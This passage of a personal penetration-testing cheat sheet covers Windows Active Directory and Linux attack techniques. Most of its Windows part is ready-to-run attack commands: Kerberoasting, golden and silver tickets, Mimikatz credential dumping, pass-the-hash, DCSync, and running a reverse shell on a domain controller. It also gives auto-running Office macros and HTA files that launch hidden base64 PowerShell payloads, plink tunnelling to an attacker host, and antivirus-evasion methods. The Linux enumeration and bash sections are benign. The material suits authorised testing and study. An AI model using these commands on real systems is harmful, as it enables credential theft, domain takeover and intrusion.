- **Rubeus** (every 30 seconds):
    
    ```powershell
    .\Rubeus.exe harvest /interval:30
    ```

### Kerberoasting

> **Kerberoasting** allows a user to request a service ticket for any service with a registered **SPN** then use that ticket to crack the service password.
 
- **Rubeus** (local):
    
    ```powershell
    .\Rubeus.exe kerberoast
    ```
    
- **Impacket** (remote):
    
    ```bash
    GetUserSPNs.py <Domain>/<username>:<password> -dc-ip <IP> -request
    ```
    
- Cracking Kerberos 5 etype 23 TGS-REP:
    
    ```bash
    hashcat -m 13100 -a 0 hash.txt Pass.txt
    ```
    

### AS-REP Roasting

> **AS-REP Roasting** dumps the `krbasrep5` hashes of user accounts that have Kerberos pre-authentication disabled.
 
- **Rubeus** (local => automatically find as-rep roastable users):
    
    ```powershell
    .\Rubeus.exe asreproast
    ```
    
- **Impacket** (remote => requires to enumerate as-rep roastable users with `BloodHound` for instance):
    
    ```bash
    GetNPUsers.py <Domain>/[username] -dc-ip <IP> -request  [-no-pass -usersfile users.txt]
    ```
    
- Cracking Kerberos 5 AS-REP etype 23 *(sometimes need to add `$23` after `$krb5asrep`)*:
    
    ```bash
    hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
    ```
    

### 🛂 Pass The ticket

- Export all the tickets into **`.kirbi`** files in the current directory:
    
    ```
    mimikatz # sekurlsa::tickets /export
    ```
    
- Impersonate a given ticket:
    
    ```
    mimikatz # kerberos::ptt <ticket>
    ```
    
- Verify with `klist` (or with `kerberos::list` within `mimikatz`) that we successfully impersonated the ticket by listing our cached tickets.

### 🎟️ Silver ticket (`mimikatz`)

1. Dump the hash and security identifier (SID) of the targeted service account:
    
    ```
    mimikatz # lsadump::lsa /inject /name:<SERVICE_NAME>
    ```
    
2. Create a silver ticket:
    
    ```
    mimikatz # kerberos::purge
    Ticket(s) purge for current session is OK
    mimikatz # kerberos::list
    ...
    mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<USER_SID> /target:<SPN> /service:<SERVICE_PROTOCOL> /rc4:<SERVICE_HASH> /ptt
    
    mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<USER_SID> /krbtgt:<SERVICE_NTLM_HASH> [/id:1103] [/ptt]
    ```
    
3. Open a new command prompt with elevated privileges with the given ticket:
    
    ```
    mimikatz # misc::cmd
    ```
    

### 🎫 Golden ticket (`mimikatz`)

1. Dump the hash and security identifier (SID) of the Kerberos Ticket Granting Ticket (**krbtgt**) service account:
    
    ```
    mimikatz # lsadump::lsa /inject /name:krbtgt
    ```
    
2. Create a golden ticket:
    
    ```
    mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> [/id:500] [/ptt]
    ```
    
3. Open a new command prompt with elevated privileges and access to all machines with:
    
    ```
    mimikatz # misc::cmd
    ```
    
    ```powershell
    psexec.exe \\$REMOTE_MACHINE_HOSTNAME cmd.exe
    ```
    
    ⚠️ OverPass the Hash with `PsExec` when using hostname, otherwise (IP) NTLM authentication would be blocked
    

➡️ [Golden Ticket - Mimikatz alternative (impacket)](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#golden-ticket)

---

## 🧗‍♂️ Privesc

> [Windows Privesc notes](https://github.com/amirr0r/notes/blob/master/Windows/Privesc.md#windows-privesc)
 

### 🕵️ Enumeration

- List information about current: `net user <username>`
- List groups I belonged to: `whoami /groups` or `net user /domain <username>`
- List users: `net user`
- `systeminfo`
- `tasklist`
    - `tasklist /SVC` ⇒ return processes that are mapped to a specific Windows service
- View the permissions set on a directory (or file): `icacls <directory|file>`
- Get user *Security Identifier* (SID): `whoami /user`
- View information about a registry key: `reg query <key>`
    - `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
    - `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
    
    If one of these keys is **enabled** (set to 1), any user can run Windows Installer packages with elevated privileges.
    
- List running processes/services:
    
    ```powershell
    Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
    ```
    
- List installed applications: `wmic service get name,displayname,pathname,startmode`
    - `<same command>|findstr /i "auto" |findstr /i /v "c:\windows"` (list of non-standard services)
    - Installed by the Windows Installer: `wmic product get name, version, vendor`
    - System-wide updates: `wmic qfe get Caption, Description, HotFixID, InstalledOn`
    
    ⚠️WMI command-line (WMIC) utility is deprecated as of Windows 10, version 21H1⚠️
    
- Look for saved credentials: `cmdkey /list`
    - `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
- Check scheduled tasks:
    - `schtasks /query /fo LIST /v`
    - PowerShell equivalent:
        
        ```powershell
        Get-ScheduledTask| where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
        ```
        
- Mounted disks: `mountvol`
- Drivers and Kernel Modules:
    - `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path`
    - PowerShell equivalent:
        
        ```powershell
        Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, lsmodDriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
        ```
        
- See networking routing tables: `route print`
- See open ports (active network connections): `netstat -ano`
- Current firewall profiles: `netsh advfirewall show currentprofile`
    - If active, look at firewall rules: `netsh advfirewall firewall show rule name=all`

### 🗃️ Sensitive Files

Looking for plaintext passwords:

- `dir/s *pass* == *.config`
- `findstr /si password *.xml *.ini *.txt`

SAM and SYSTEM files in:

- `C:\Windows\Repair`
- `C:\Windows\System32\config\RegBack`

> Copy them to Kali and crack them using `hashcat` or just try [Pass-the-hash](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#%EF%B8%8F-post-exploitation-pivoting-and-lateral-movement)
 

### 🧐 Checking Privileges

- Look at your privileges: `whoami /priv` ([https://github.com/hatRiot/token-priv](https://github.com/hatRiot/token-priv))
    - **SeImpersonatePrivilege**: impersonate any access tokens which it can obtain (Exploit: [Juicy Potato](https://github.com/ohpe/juicy-potato))
    - **SeAssignPrimaryPrivilege**: assign an access token to a new process. (Exploit: [Juicy Potato](https://github.com/ohpe/juicy-potato))
    - **SeBackupPrivilege**: grants **read** access to all objects on the system, regardless of their ACL.
    - **SeRestorePrivilege**: grants writeaccess to all objects on the system, regardless of their ACL.
    - **SeTakeOwnershipPrivilege**: lets the user take ownership over an object (the `WRITE_OWNER` permission).
    - More advanced:
        - SeTcbPrivilege
        - SeCreateTokenPrivilege
        - SeLoadDriverPrivilege
        - SeDebugPrivilege (used by `getsystem` => metasploit)

### 💥 Kernel exploits

`systeminfo` + [Windows exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) or [`wesng`](https://github.com/bitsadmin/wesng)

### 🏹 Exploiting services

- querying the current status of a service:
    
    ```
    sc.exe query <name>
    ```
    
- starting/stopping a service:
    
    ```
    net start/stop <name>
    ```
    
- querying the configuration of a service:
    
    ```
    sc.exe qc <name>
    ```
    
- Check our permissions ([accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) is part of **Windows Sysinternals**):
    - On a specific service => (look for `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`):
        
        ```
        .\accesschk.exe /accepteula -uwcqv user <service name>
        .\accesschk.exe /accepteula -ucqv user <service name>
        ```
        
    - On a specific service executable:
        
        ```
        .\accesschk.exe /accepteula -quvw user <service exe>
        ```
        
    - On a specific directory (look for **Unquoted Service Path**):
        
        ```
        .\accesschk.exe /accepteula -uwdq "C:"
        ```
        
    - On a specific registry:
        
        ```
        .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service_name>
        ```
        
        - overwrite the **ImagePath** registry value:
            
            ```
            reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\malicious.exe /f
            ```
            
- modifying a configuration option of a service:
    
    ```
    sc.exe config <name> <option>= <value>
    ```
    
    - Example: changing `BINARY_PATH_NAME`:
        
        ```
        sc config daclsvc binpath= "\"C:\PrivEsc\reverse-shell.exe\""
        ```
        

## 🥝 Dumping hashes and tickets with `Mimikatz`

> Other hash dumping tools: `pwdump`,[`fgdump`](http://foofus.net/goons/fizzgig/fgdump/downloads.htm),[**Windows Credential Editor**](https://www.ampliasecurity.com/research/windows-credentials-editor/) (`wce`) for older versions of Windows
 
- ask for **SeDebugPrivilege** in order to interact with the LSASS process and processes owned by other accounts (to be executed as administrator):
    
    ```
    mimikatz # privilege::debug
    Privilege '20' OK
    ```
    
- elevate the security token from high integrity (administrator) to SYSTEM integrity (not needed if `mimikatz` is launched from a SYSTEM shell)
    
    ```
    mimikatz # token::elevate
    ```
    
- dumping all password hashes:
    
    ```
    mimikatz # lsadump::sam
    ```
    
- dumping NTLM password hashes:
    
    ```
    mimikatz # lsadump::lsa /patch
    ```
    
    - Cracking them with `hashcat` (or [Pass-The-Hash](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#%EF%B8%8F-post-exploitation-pivoting-and-lateral-movement) directly): `hashcat -m 1000 ntlm-hashes.txt <WORDLIST>`
- dumping the credentials of all logged-on users:
    
    ```
    mimikatz # sekurlsa::logonpasswords
    ```
    
- dumping all service tickets of all logged-on users:
    
    ```
    mimikatz # sekurlsa::tickets
    ```
    
- download service ticket:
    
    ```
    mimikatz # kerberos::list /export
    ```
    
- 🦘 **Overpass the hash** (turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication):
    
    ```
    mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:PowerShell.exe
    ```
    
    ```powershell
    net use \\$MACHINE_HOSTNAME
    klist
    ```
    
    To gain a remote code execution:
    
    ```powershell
    .\PsExec.exe \\$MACHINE_HOSTNAME cmd.exe
    ```
    

## ↔️ Post-exploitation, Pivoting and Lateral Movement

- Add user to the domain: `net user $USERNAME $PASSWORD /add /domain`
- Add user to a group: `net group "$GROUPNAME" /add $USERNAME`
- Change user Password: `net user $USERNAME $NEW_PASSWORD`
- Execute command with: `.\PsExec.exe -accepteula [\\$HOSTNAME] -u $USERNAME -p $PASSWORD $COMMAND`
- [Silver tickets](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#%EF%B8%8F-silver-ticket-mimikatz)
- **DCOM** (Distributed Component Object Model): interaction between multiple computers over a network
    - Old technology dating back to the very first editions of Windows
    - [Abusing Windows Management Instrumentation (WMI) to Build a Persistent, Asyncronous, and Fileless Backdoor [BlackHat 2015]](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
    - Requires local admin access + RPC on TCP port 135
    - Excel example: (require to add a malicious macro in the document)
        
        ```powershell
        # 1. Instance of a DCOM object with program ID => Excel
        $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "$VICTIM_IP"))
        
        # cmdlet to discover its available methods and objects
        #$com | Get-Member
        
        # 2. Copy the Malicious Excel document to the target
        $LocalPath = "C:\Users\Administrator\myexcel.xls"
        
        $RemotePath = "\\$VICTIM_IP\c$\myexcel.xls"
        
        [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
        
        # 3. Create a profile for the SYSTEM account (used for the opening process)
        $Path = "\\$VICTIM_IP\c$\Windows\sysWOW64\config\systemprofile\Desktop"
        $temp = [system.io.directory]::createDirectory($Path)
        
        # 4. Open the Excel Document remotely
        $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
        
        # 5. Run the Macro
        $com.Run("mymacro")
        ```
        
- #️⃣ Pass The Hash:
    - `evil-winrm -i <ip> -u <username> -H <NTLM_HASH>`
    - `pth-winexe -U '<username>%<NTLM_HASH' //<IP> cmd.exe` (rely on SMB protocol)
        - Executing an application such as `cmd` requires administrative privileges (authentication to the administrative share `C$` + creation of a Windows service)
    - `python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes <NTLM_Hash> <USER>@<IP> cmd.exe`
- **DCSync** privilege ⇒ give us the right to perform a domain synchronization and finally dump all the password hashes
    
    > When a DC receives a request for an update, it does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges.
    > 
    - Retrieving all of the password hashes that a user account (that is synced with the domain controller) has to offer:
        - Impacket
            
            ```bash
            python3 /usr/share/doc/python3-impacket/examples/secretsdump.py [-just-dc-ntlm] <domainName>/<username>[:<password>]@<IP>
            ```
            
        - Mimikatz: `lsadump::dcsync /user:Administrator`
- [Metasploit incognito extension](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/) + PowerShell *[New-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.1)* cmdlet
    
    ```bash
    meterpreter > use incognito
    meterpreter > list_tokens -u
    meterpreter > impersonate_token $DOMAIN\\$USERNAME
    ```
    
    ```powershell
    # Get DC hostname with nslookup
    C:\Windows\system32> nslookup
    > set type=all
    >  _ldap._tcp.dc._msdcs.$DOMAIN
    > exit
    
    PS C:\Windows\system32> $dcsesh = New-PSSession -Computer $DC_HOSTNAME
    # Execute ipconfig on DC
    PS C:\Windows\system32> Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
    # Copy reverse shell executable to DC
    PS C:\Windows\system32> Copy-Item "C:\Users\Public\reverse_shell.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
    PS C:\Windows\system32> Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\reverse_shell.exe}
    
    ```
    

> **TODO**: speak about ZeroLogon, [NTLM Relay](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html), LLMNR, [`Responder.py`](https://github.com/SpiderLabs/Responder), AD-CS.
 

## 🔁 Port forwarding and Tunneling

### Metasploit `autoroute`

- With a `meterpreter` session: `use multi/manage/autoroute` + `auxiliary/server/socks_proxy`
	* `set ReverseAllowProxy true` + `set Proxies socks5:127.0.0.1:1080` (for example)

### `plink.exe`

⚠️The first time we connect to a host, we need to prefix the command with `cmd.exe /c echo y |` because `plink` will attempt to cache the host key in registry.⚠️

```powershell
# Remote port Forwarding
plink.exe -ssh -l $USER -pw $PASSWORD -R $RHOST:$RPORT:$LHOST:$LPORT $RHOST
# Local Port Forwarding
plink.exe -L $VICTIM_IP:$VICTIM_PORT:$ATTACKER_IP:$ATTACKER_PORT kali@$ATTACKER_IP
```

### `Netsh`

> Installed by default on every modern version of Windows.
 

⚠️**IP Helper service** must be running and IPv6 support must be enabled for the interface we will use⚠️

- Add a v4tov4 proxy:
	```powershell
	netsh interface portproxy add v4tov4 listenport=$PORT listenaddress=$IP connectport=$PORT connectaddress=$IP
	```
- Check:
	```powershell
	netsh interface portproxy show v4tov4
	```
- Remove the proxy:
	```powershell
	netsh interface portproxy delete v4tov4 listenaddress=$IP listenport=$PORT
	```

## 🤠 Client-side attack

### 🖱️HTA application

> Files with the extension `.hta` are automatically executed by the **Internet Explorer** (IE) browser as HTML application (via **`mshta.exe`**).
 

💡 We can use `MSFvenom` to generate a HTA malicious application [Link](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#msfvenom)

⚠️ If we visit a URL containing a HTML application, IE will trigger two popups. One that asks us if we want to open or save the file. Another security warning to inform the application will be opened outside the Protected mode.

Example [Windows Script Host Shell object](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99(v=vs.84)) opening **calc.exe** via [ActiveXObjects](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Microsoft_Extensions/ActiveXObject):

```html
<html>

<script>
  var c = 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);
</script>

<head></head>

<body>
  <script>
    self.close();
  </script>
</body>

</html>
```

### 🖥️ Office documents

- Malicious macros:
    - Go to *View > Macros* to add macros. Do not forget to embed the macros in the doc via *Macros in: Document1 (document)*!
    - Add Macro(s):
        - The `AutoOpen` procedure is executed when a new document is opened
        - The `Document_Open` procedure is executed when an already-open document is re-opened
            
            ```VBA
            Sub AutoOpen()
            	MyMacro
            End Sub
            
            Sub Document_Open()
            	MyMacro
            End Sub
            
            Sub MyMacro()
            	CreateObject("Wscript.Shell").Run "cmd"
            End Sub
            ```
            
    - Save the document as `.docm` (Word Macro-Enabled Document) or older `.doc` (Word 97-2003 Document) and **NOT** as `.docx` format
    
    💡 We can use the base64-encoded PowerShell payload of `MSFvenom` when generating a malicious HTA application (for a reverse shell for instance) [Link](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#msfvenom)
    
    ⚠️ VBA has a 255-character limit for literal strings
    
    💡 Split the PowerShell command into multiple lines via a Python script:
    
    ```python
    str = "powershell.exe -nop -w hidden -e <BASE64_PAYLOAD>"
    n = 50
    print(f'Str = "{str[:50]}"')
    for i in range(50, len(str), n):
        print(f'Str = Str + "{str[i:i+n]}"')
    ```
    
    ```VBA
    Sub AutoOpen()
    	MyMacro
    End Sub
    
    Sub Document_Open()
    	MyMacro
    End Sub
    
    Sub MyMacro()
        Dim Str As String
    
        Str = "powershell.exe -nop -w hidden -e <SPLITTED_BASE64_PAYLOAD>"
        Str = Str + "<SPLITTED_BASE64_PAYLOAD>"
    		...
        CreateObject("Wscript.Shell").Run Str
    End Sub
    ```
    
    > **Note**: the macro security warning only re-appears if the name of the document is changed

- Embedding/Linking Object using Batch file:
    - Word or Excel:
        - *Insert > Object > Create from File*
        - Import a Batch File
            
            ```batch
            START powershell.exe -nop -w hidden -e <BASE64_PAYLOAD>
            ```
            
        
        💡**Tip**: *Display as icon > Change Icon*
        
    - **[Protected View](https://support.microsoft.com/en-us/topic/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653?ui=en-us&rs=en-us&ad=us)** Bypass: a sandbox feature which disables all editing and modifications in the document + blocks the execution of macros or embedded objects
        
        ⚠️ Malicious office docs are effective when served locally but when served from Internet (email, download link), **Protected View** has to be bypass.  ****
        
        💡 **Microsoft Publisher** does not enable it 😇
        

## 🛡️ Antivirus Evasion

> [Ippsec - AV Evasion (mimikatz)](https://youtu.be/9pwMCHlNma4)
 

### Types of Detection

1. **Signature**-Based detection (most common) ➡️ denylist technology
2. **Heuristic**-Based detection ➡️ relies on various patterns and program calls (as opposed to signatures which are simple byte sequences) that are considered malicious. 
    
    ➡️ [malapi.io](https://malapi.io/)
    
3. **Behaviora**l-Based Detection ➡️ dynamically analyzes the behavior of a binary file.
    
    Executing the file in question in a virtual machine, looking for behaviors or actions that are considered malicious.
    

### Methods to Bypass Detection

<details>
    <summary><b>on-disk</b> ⇒ focus on modifying files physically stored on disk in an attempt to evade signature detection.</summary>
    
- 📦 **Packers** ➡️ generate a smaller, functionally equivalent executable with a new binary structure (and therefore a **new signature**).

- 🔡 **Obfuscation** ➡️ reorganize and mutate code (changing variable names, inserting useless code, splitting or reordering functions, etc.).

- 🔢 **Crypters** ➡️ cryptographically alters executable code, adding a decrypting stub that restores the original code upon execution.

</details>
<details>    
    <summary><b>in-memory</b> ⇒ avoid the disk entirely (because of AV maturity).</summary>
    
- 💉 **Remote Process Memory Injection** ➡️ inject the payload into another valid PE that is not malicious.

- 💉 **Reflective DLL Injection** ➡️ load a DLL (stored by the attacker) in the process memory.

- 🔀 **Process Hollowing** ➡️ launch a non-malicious process in a suspended state, replacing its memory image with a malicious one, resume the execution.

- 🪝 **Inline hooking** ➡️ modifying memory and introducing a hook (instructions that redirect the code execution)
</details>

### Tools to Bypass Detection

- [Shellter](https://www.shellterproject.com/)
- [Enigma Protector](https://www.enigmaprotector.com/en/home.html)
- https://github.com/sevagas/macro_pack
- PowerShell (for **in-memory injection**)

## 🛠️ Useful Windows Tools

- [nishang](https://github.com/samratashok/nishang): collection of scripts and payloads which enables usage of PowerShell for offensive security
- [dnSpy](https://github.com/0xd4d/dnSpy#dnspy---latest-release---%EF%B8%8F-donate): debugger and .NET assembly editor.
- [BloodHound](https://github.com/BloodHoundAD/Bloodhound/wiki): reveal the hidden and often unintended relationships within an Active Directory environment.
- [Gist - Windows Privilege Escalation](https://gist.github.com/sckalath/8dacd032b65404ef7411)
- [LOLBAS](https://lolbas-project.github.io/#)
    - [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup): offline command line lookup utility
- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite#peass---privilege-escalation-awesome-scripts-suite)
    - [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [wesng](https://github.com/bitsadmin/wesng): Windows Exploit Suggester - Next Generation (WES-NG)
- [Watson](https://github.com/rasta-mouse/Watson#watson): enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities
- https://github.com/pentestmonkey/windows-privesc-check
- [mimikatz](https://github.com/gentilkiwi/mimikatz#mimikatz)

## Useful Windows / AD links

- [VbScrub - Tutorials](https://www.youtube.com/playlist?list=PL3B8L-z5QU-Yw80HOGXXUASBfv_K1WwO5)
- [Hackndo - Windows articles](https://beta.hackndo.com/archives/#windows)
- [Fuzzysecurity - Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
- [zer1t0 - Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)
- [RedTeam_CheatSheet.ps1](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)
- [adsecurity.org](https://adsecurity.org/)

---

# 🐧 Linux

## Small Tips

- `mkdir -p somedir/{exploit, scan, report}`
- Alternative to `netstat -plant` ⇒ `ss -antlp`
- Environment variables:
    - `$HISTSIZE` ⇒ controls the number of commands stored in memory (for the current session)
    - `$HISTFILESIZE` ⇒ configures how many commands are kept in the history file
    - `$HISTIGNORE` ⇒ for filtering out basic commands
    - `$HISTTIMEFORMAT`  controls date and/or time stamps in the output of **history**
    - `$HISTCONTROL` ⇒ defines whether or not to remove duplicate commands
        
        ```bash
        export HISTCONTROL=ignoredups
        ```
        

### Cross-compiling

```bash
apt install mingw-w64
i686-w64-mingw32-gcc program.c -o program.exe
```

## 🔁 Port forwarding and Tunneling

- Using [SSH and ProxyChains](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#tcp-port-22-ssh)
- `rinetd`
    - `service rinetd start` then `ss -antp | grep "rinetd"`
    - `/etc/rinetd.conf`
        
        ```bash
        # bindadress    bindport  connectaddress  connectport
        ```
        
        - `bindaddress` ⇒ bound (“**listening**”) IP address
        - `bindport` ⇒ bound (“**listening**”) port
        - `connectaddress` ⇒ traffic’s **destination** address
        - `connectport` ⇒ traffic’s **destination** port
- `httptunnel` (when SSH is not allowed)
    - Server: `hts --forward-port localhost:$FORWARD_PORT $LISTEN_PORT`
    - Client: `htc --forward-port $LOCAL_PORT $IP:$REMOTE_PORT`

## 🧑‍💻 Bash Scripting

`#!/bin/bash`(**shebang**)

- adding `-x` will add some debug information

### Variables

```bash
# Both are equivalent
user=$(whoami)
user2=`whoami`
# incrementation (FR)
((counter++))
```

### Arguments

`$1, $2, ...`

- `$0` ➡️ name of the Bash script
- `$#` ➡️ number of arguments
- `$@` ➡️ all arguments passed to the Bash script
- `$?` ➡️ exit status of the most recently run process
- `$$` ➡️ process ID of the current script
- `$USER` ➡️ username of the user running the script
- `$HOSTNAME` ➡️ host name of the machine
- `$RANDOM` ➡️ random number
- `$LINENO` ➡️ current line number in the script

### Reading User Input

`read -p` ➡️ specify prompt 

`read -s` ➡️ makes the user input silent (e.g. asking for password)

### If, Else Statements

- `!EXPRESSION` : The EXPRESSION is false.
- `-n STRING` : STRING length is greater than zero
- `-z STRING` : The length of STRING is zero (empty)
- `STRING1 != STRING2` : STRING1 is not equal to STRING2
- `STRING1 == STRING2` : STRING1 is equal to STRING2
- `INTEGER1 -eq INTEGER2` : INTEGER1 is equal to INTEGER2
- `INTEGER1 -ne INTEGER2` : INTEGER1 is not equal to INTEGER2
- `INTEGER1 -gt INTEGER2` : INTEGER1 is greater than INTEGER2
- `INTEGER1 -lt INTEGER2` : INTEGER1 is less than INTEGER2
- `INTEGER1 -ge INTEGER2` : INTEGER1 is greater than or equal to INTEGER 2
- `INTEGER1 -le INTEGER2` : INTEGER1 is less than or equal to INTEGER 2
- `-d FILE` : FILE exists and is a directory
- `-e FILE` : FILE exists
- `-r FILE` : FILE exists and has read permission
- `-s FILE` : FILE exists and it is not empty
- `-w FILE` : FILE exists and has write permission
- `-x FILE` : FILE exists and has execute permission

### Loops

```bash
# for loops
for i in {1..10}; do echo 10.11.1.$i;done
for ip in $(seq 1 10); do echo 10.11.1.$ip; done
# while loops
while [ ]
do
	# code starts here!
done
```

### Functions

```bash
# One way
function function_name {
	#commands...
	return $RANDOM
}
# Another way
function_name {
	#commands...
	return $RANDOM
}
```

### Passing arguments

```bash
#!/bin/bash
# passing arguments to functions
pass_arg() {
	echo "Today's random number is: $1"
}
pass_arg $RANDOM
```

## TCP Port 2049 (NFS)

```bash
nmap --script=nfs-showmount $TARGET
showmount -e  $TARGET
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
# -o nolock (to disable file locking) is often needed for older NFS servers
```

## 🧗‍♂️ Privesc

> [Linux Privesc notes](https://github.com/amirr0r/notes/blob/master/Linux/Privesc.md#privesc)
 

### 🕵️ Enumeration

- Current user groups: `id`
    - `sudo -l` list sudo config/program a user is allowed to run (if in **sudoers**)
- Users: `cat /etc/passwd`
- Info about OS Version and Architecture:
    - `uname -a`
    - `cat /etc/*release`
    - `cat /etc/issue`
- Running processes: `ps aux`
- Writable directories: `find / -writable -type d 2>/dev/null`
- Scheduled tasks: `cat /etc/crontab`, `crontab -l`, `ls -lah /etc/cron*`
- SUID binaries: `find / -perm -u=s -type f 2>/dev/null`
- Installed applications: `dpkg -l` (Debian like distros)
- Mounted disks:
    - `mount`
    - `cat /etc/fstab`
    - `lsblk`
    - `fdisk -l`
- Networking information:
    - `ifconfig` or `ip a`
    - `/sbin/route` or `routel` (depending on Linux flavor and version)
    - List connections:
        - `netstat -plant`
        - `netstat -tulpn`
        - `ss -anp`
    - Firewall rules
        - `grep -Hs iptables /etc/*` (if unprivileged user)
        - `iptables -L` (requires root privileges)

> TODO...

### 🛠️ Linux Privesc Tools

- [GTFOBins](https://gtfobins.github.io/)
- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite#peass---privilege-escalation-awesome-scripts-suite)
    - [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [pspy](https://github.com/DominicBreuker/pspy#pspy---unprivileged-linux-process-snooping)

---

# Useful links

- [HackTricks](https://book.hacktricks.xyz/)
- [ired.team](https://www.ired.team/)
- [swisskyrepo - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
- [THM - What The Shell? (WU)](https://github.com/amirr0r/thm/tree/master/what-the-shell)
- [explainshell.com](https://explainshell.com/)
- [tldr.ostera.io](https://tldr.ostera.io/)
- [fingerprintjs](https://fingerprintjs.com/)
